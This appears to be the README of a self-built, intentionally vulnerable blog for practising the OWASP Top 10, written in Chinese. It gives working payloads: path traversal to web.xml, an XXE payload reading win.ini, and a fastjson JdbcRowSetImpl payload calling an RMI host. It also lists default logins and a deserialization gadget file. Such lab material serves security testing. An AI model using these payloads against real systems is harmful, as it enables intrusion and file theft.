# Blog
自用漏洞验证平台，主要为测试owasp top 10漏洞


A1注入：search.htm

A2失效的身份认证和会话管理：登录页无限制，可暴力破解
![image](https://user-images.githubusercontent.com/1740718/131211872-d518d5c2-44c7-4110-a53e-c6845272f71d.png)

A3敏感信息泄漏：file.htm  download.htm?fileName=../WEB-INF/web.xml

A4 XXE:login2.htm

xml=<!DOCTYPE%20foo%20[<!ELEMENT%20foo%20ANY><!ENTITY%20abc%20SYSTEM%20"file:///c:/windows/win.ini">]><login><username>%26abc;</username><password>fdsf</password></login>

A5失效的访问控制：水平越权 管理后台-》读取博客

登录帐号：
test/test
tridentj/tridentj

A6安全配置错误：暂无

A7 XSS：search.htm  

&lt;img src="img/1.png" /&gt;

A8不安全的反序列化:upload.htm (apache-commons-collections-3.2.1) resources目录下cc.bin windows下弹出计算器

A9：fastjson 1.2.24前反序列化漏洞
http://localhost:8080/blog/updateUserInfo.htm

部署环境，参考resources中的fastjson.7z

json提交框中输入以下内容：
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.2.13.27:9999/Poc","autoCommit":true}
![image](https://user-images.githubusercontent.com/1740718/133755384-f98ca858-daa6-4642-99eb-47dacd51f858.png)



A10：无

![image](https://user-images.githubusercontent.com/1740718/131211747-2be958b6-4c49-4a79-b442-2ed0787443de.png)
![image](https://user-images.githubusercontent.com/1740718/131211703-2e6a2c93-40ac-416e-aed9-8c95a66bb6b5.png)


